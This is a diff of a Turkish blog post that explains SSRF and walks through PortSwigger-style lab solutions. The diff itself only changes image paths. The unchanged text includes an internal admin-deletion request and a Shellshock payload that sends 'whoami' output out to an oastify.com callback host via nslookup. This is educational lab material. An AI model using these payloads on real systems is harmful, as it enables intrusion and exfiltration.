@@ -12,7 +12,7 @@ Siber güvenlik ile ilgili konularda duyduğunuz terimlerden bu konunun ne ile a
 
 Şimdi SSRF konusunu  detaylı bir şekilde ele alalım. Karşımızda bir uygulama olduğunu ve bu uygulamanın bir external resource’a talepte bulunduğunu düşünelim. Günümüzde application’lar tek başına yaşamını sürdürmediği için burada uygulamanın bulunduğu sunucular bölgesinde başka sistemler de olabilir, yani microservice, database, elasticsearch, memcache gibi yapılar da yer alabilir. Siz dış dünyadan buraya request attığınızda sistem içerisindeki yapılara erişim sağlayamamaktasınız. Bunlar internal accessible yapıdadır. Ancak burada uygulamanın sizden bir URL aldığı ve bunun için bir HTTP request’i oluşturduğu bir feature (özellik) düşünün. Örneğin böyle bir feature’ın neden olacağını düşününce de aklımıza birçok örnek gelebilir; sizden aldığı url’deki bir resmi indirme gibi örnekler olabilir. Tam bu noktada giden bu request’i bir şekilde manipüle edip internal bir servise erişmesini sağlayabilirsek ne olur? işte SSRF’in başladığı nokta da burasıdır.  
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled.png)
 
 # SSRF'e Farklı Bakışlar - XXE ile Benzerlik
 
@@ -28,55 +28,55 @@ Dolayısıyla karşımıza 2 tip SSRF zafiyeti çıkmaktadır. Biri size doğrud
 
 # Lab: Basic SSRF against the local server
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 1.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-1.png)
 
 Buradaki lab ortamında bizden `carlos` kullanıcısını silmemiz istenmektedir. Sisteme giriş yaptıktan sonra bir ürünün `check stock`  özelliğini kullanıp giden request’i inceleyelim. 
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 2.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-2.png)
 
 Gönderilen request’i incelediğimizde uygulamanın bir URL’e istek gönderdiğini görmekteyiz. 
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 3.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-3.png)
 
 Decode ettiğimizde ise bu URL’in nasıl bir yapıda olduğunu görebiliriz. Burada yapmamız gereken şey lab ortamının bizden istediğini uygulayarak ilerlemek olacaktır. 
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 4.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-4.png)
 
 Dolayısıyla `http://localhost/admin` URL’ine erişip erişmediğimizi kontrol ederek ilerleyebiliriz. Burada da görmüş olduğunuz üzere başarıyla ulaşabilmekteyiz. Aynı zamanda `carlos`  kullanıcısını silmek için de hangi adrese gitmemiz gerektiği ilgili a tag’inin href’inde verilmiş durumdadır. 
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 5.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-5.png)
 
 Dolayısıyla bu request’i gönderdiğimizde `carlos`  kullanıcısını silerek lab ortamının bizden istediği görevi yerine getirmiş olmaktayız.
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 6.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-6.png)
 
 Ve lab ortamının başarıyla çözüldüğünü görebilirsiniz.
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 7.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-7.png)
 
 # Lab: Basic SSRF against another back-end system
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 8.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-8.png)
 
 Buradaki lab ortamında ise kullanacağımız temel şey Burp Intruder ile verilen IP aralığında bize hangi IP adresinin nasıl bir sonuç getirdiğini incelemek olacaktır. Dolayısıyla tekrar bir ürünün `check stock`  özelliğini kullanınca oluşan request’i yakalayıp bunu Intruder’a göndermemiz gerekmektedir. 
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 9.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-9.png)
 
 Burada verilen nokta için denemeler yaparak gelen response’ları incelemeliyiz.
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 10.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-10.png)
 
 Ardından payload tipimizi de sayılardan oluşacak şekilde ayarlayıp 1’den 255’e kadar deneyebileceğimiz bir yapı kurarak Intruder’ı başlatıyoruz.
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 11.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-11.png)
 
 Burada Intruder henüz çalışmasını bitirmemişken dikkatimizi çeken bir nokta görmekteyiz. Diğerrlerinin tersine 83 portu için bir sonuç bulunamadığı söylenmektedir. Bu da 83 portuna özel bir durum olduğu anlamına gelir. Path yanlış olduğu için bu şekilde response almaktayız. 
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 12.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-12.png)
 
 Path olarak /admin verdiğimizde admin ile ilgili olan sayfanın geldiğini görebiliriz artık.
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 13.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-13.png)
 
 Lab ortamı bizden carlos kullanıcısını silmemizi istediği için bu işlemi gerçekleştiriyoruz. 
 
@@ -86,93 +86,93 @@ stockApi=http://192.168.0.83:8080/admin/delete?username=carlos
 
 Ve lab çözüldü…
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 14.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-14.png)
 
 # Lab: Blind SSRF with out-of-band detection
 
 Blind SSRF’te response’u göremeyiz. Bu lab ortamı da buna örnek olarak hazırlanan bir sistem içermektedir. 
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 15.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-15.png)
 
 Tekrardan bir ürünü ziyaret ettiğimizde oluşan request’i inceleyelim. Bu request üzerinde referer ile ilgili bir değişiklik yapıp [google.com](http://google.com) verdiğimizde response’un geldiğini görmekteyiz. Yani burada google.com’a giden bir HTTP request’i olduğunu söyleyebiliriz. Dolayısıyla google.com yerine kendimize ait bir web sunucumuza istekte bulunabiliriz. Böylece dış dünyaya yönelik bir DNS talebinin çıktığını görüyoruz, DNS’in çözülmeye çalışıldığını söyleyebiliriz. Ancak Response bize gelmemektedir. Blind SSRF olduğu için böyle bir durum söz konusudur. 
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 16.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-16.png)
 
 Dolayısıyla burada Burp Collabrator aracılığıyla bir istekte bulunup “pull now” yaptığımızda lab ortamı çözülmüş olacaktır. 
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 17.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-17.png)
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 18.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-18.png)
 
 # Lab: SSRF with filter bypass via open redirection vulnerability
 
 Bu lab ortamında ise uygulama sunucusunun HTTP Response’ta 302 redirection gördüğünde redirection’ı takip edip etmediğini simüle ettikleri bir durum söz konusudur. 
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 19.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-19.png)
 
 Bir önceki yazıda application üzerindeki validation’lardan (doğrulamalardan) bahsetmiştik. Yani buradaki application aldığı URL üzerinde bir validation yapmaktadır. Ancak bu validation’ı hangi katmanda veya kaç şekilde yaptığını denemeden bilmemekteyiz. Örneğin URL olarak `http://localhost` verdiğimizde uygulama buraya doğrudan erişim sağlayamadığımızı söylemektedir. Ancak bu uygulamada bir Open Redirect zafiyeti bulursak, kendi kontrol ettiğimiz bir adrese redirection gerçekleşebilir. Bu durumda uygulamanın redirection’larda da kontrol yapıp yapmadığını tespit etmeliyiz. Bu lab ortamı özelinde de erişmemizi istedikleri yer `192.168.0.12:8080/admin`  adresidir. Bu adrese erişip `carlos`  kullanıcısını silmemiz gerekmektedir. 
 
 Şimdi adım adım ilerleyip incelememiz gereken request’e erişelim. Öncelikle bir ürünün detaylarına gidelim;
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 20.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-20.png)
 
 Ürün detaylarına gittikten sonra da `check stock`  özelliğini kullandıktan sonra oluşan request’i inceleyelim;
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 21.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-21.png)
 
 Oluşan request’i incelediğimizde ise bizden full URL almak yerine bir endpoint aldığını görmekteyiz. 
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 22.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-22.png)
 
 Erişmek istediğimiz URL’e gitmeye çalıştığımızda böyle bir URL’in kabul edilmediğini görmekteyiz. 
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 23.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-23.png)
 
 Burada aradığımız şey aslında Open Redirection zafiyetidir. Burada hangi endpoint’te bu zafiyetin olduğunu bulmalıyız. 
 
 Bunu düşünürken uygulamada bir sonraki ürüne gidebileceğimiz bir özellik bulunduğunu görüyoruz. 
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 24.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-24.png)
 
 Oluşan request’i de incelediğimizde aşağıdaki gibi olduğunu görebiliriz. 
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 25.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-25.png)
 
 Eğer burada `path`  üzerinde verdiğimiz değerde bir validation yoksa buraya istediğimiz şeyi yazarak ilerleyebiliriz. Dolayısıyla bizden erişmemizi istedikleri adresi yazıp erişmeye çalışabiliriz burada.  Bu uygulama `stocApi` parametresinde `path` ’e bakmaktadır. Ancak biz bu parametrede istediğimiz adrese redirection yaptırabilmekteyiz. Redirection aldığında kontrol etmediği için de istediğimiz hedefe ulaşmış oluyoruz. 
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 26.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-26.png)
 
 Dolayısıyla artık `carlos` kullanıcısını belirtilen URL ile silebiliriz. 
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 27.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-27.png)
 
 Ve lab ortamının başarıyla çözüldüğünü görebiliriz…
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 28.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-28.png)
 
 # Lab: Blind SSRF with Shellshock exploitation
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 29.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-29.png)
 
 Bu lab ortamında ilerlerken ihtiyacımız olabilecek bir Burp Extension’ı bulunmaktadır. Burp Suite Professional sürümü için geçerlidir. `Collabrator Everywhere` isimli bu extension sayesinde Burp Suite tüm request’leri manipüle eder. Tüm olası header alanlarının içerisinde her yere Burp Suite’in callback adresini yazmaktadır. Tüm header’lar için collabrator adresini yazarak bir cevap gelip gelmediğini kontrol etmektedir. 
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 30.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-30.png)
 
 Lab ortamına geri dönecek olursak bizim zafiyetimiz büyük ihtimalle `referer`  alanındadır. Dolayısıyla buraya kendi collabrator adresimizi yazarak request’i gönderiyoruz ve gelen response’u inceliyoruz. 
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 31.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-31.png)
 
 Collabrator üzerinde baktığımızda da gelen sonuçlar bu şekildedir. 
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 32.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-32.png)
 
 Burada ayrıca request üzerinde `User-Agent`alanını da değiştirdiğimizde collabrator’e geldiğini görmekteyiz. Bu duruma gerçek hayatta pek rastlanmasa da bu lab özelinde **Shellshock**’u uygulatabilmek için böyle bir senaryo oluşturulmuştur. 
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 33.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-33.png)
 
 Değiştirdiğimiz değerin collabrator tarafında da geldiğini bu şekilde ispat edebiliriz. 
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 34.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-34.png)
 
 Bu noktada artık **Shellshock** exploit’lerine bakmamız lazım. Kullanacağımız payload, lab ortamının da bizden istediği bilgileri elde edebileceğimiz bir şekilde olması gerektiğinden dolayı bu şekilde olmalıdır; 
 
@@ -180,7 +180,7 @@ Bu noktada artık **Shellshock** exploit’lerine bakmamız lazım. Kullanacağ�
 () { :; }; nslookup $(whoami).9r1gkbi8d28pf6aba2y65dutokubi26r.oastify.com
 ```
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 35.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-35.png)
 
 Burada Burp Intruder aracılığıyla bize verilen IP aralığında hangi IP adresinin bir sonuç getirip getirmeyeceğinin testini de yapmış olmaktayız. Dolayısıyla burada 1’den 255’e kadar deneme yaparak doğru IP adresini bulup buradaki kullanıcı adını Collabrator’de yakalamış olacağız. 
 
@@ -188,7 +188,7 @@ Burada yaşanan olayı aslında şu şekilde açıklayabiliriz;
 
 Client tarafından application’a gönderilen bir request üzerinden düşünelim. Application buradaki request’i aldığı zaman iç taraftaki bir analitik uygulaması `referer`’daki URL’e HTTP talebi gönderirken o talebin `User-Agent`’ına da bizden aldığı değeri yazmaktadır. Bu iki kısım (Referer ve User-Agent) bizim **Input** alanlarımızdır. Bu adrese gittikten sonra iç network’ü (`internal network`) taramaya başlamaktayız. Gittiğimiz bu iç network’teki web sunucularından biri de eski bir web sunucusudur ve Shellshock zafiyeti bulunmaktadır. Bu da User-Agent üzerinden tetiklenebilir. Burada da `nslookup` komutu ile o sunucuda `whoami` çıktısını bizim collabrator sunucumuz içerisinde bir subdomain olarak dışarı taşıtmaktayız. 
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 36.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-36.png)
 
 Bu açıklamayı yaptıktan sonra da geri dönecek olursak burada Intruder ile yaptığımız denemede bir başarı elde edemedik. Dolayısıyla önce hangi web sunucusunun zafiyetli olduğunu tespit etmemiz daha sonra da buradan bilgi çıkarımı yapmamız gerekmektedir. 
 
@@ -219,15 +219,15 @@ Priority: u=0, i
 
 Bu sayede gönderdiğimiz request ile hedef sistemde istediğimiz bilgiyi elde etmiş bulunmaktayız. 
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 37.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-37.png)
 
 Sonucu gönderdiğimizde ise artık lab ortamını çözmüş oluyoruz.
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 38.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-38.png)
 
 Bununla birlikte SSRF Lab’larının da tamamını çözmüş bulunduk.
 
-![Untitled](0x16 Server-Side Request Forgery Nedir d3c4b2ebcb764d66b80606cea77bf5a5/Untitled 39.png)
+![Untitled](0x16-Server-Side-Request-Forgery-Nedir-d3c4b2ebcb764d66b80606cea77bf5a5/Untitled-39.png)
 
 # KAYNAKLAR
 
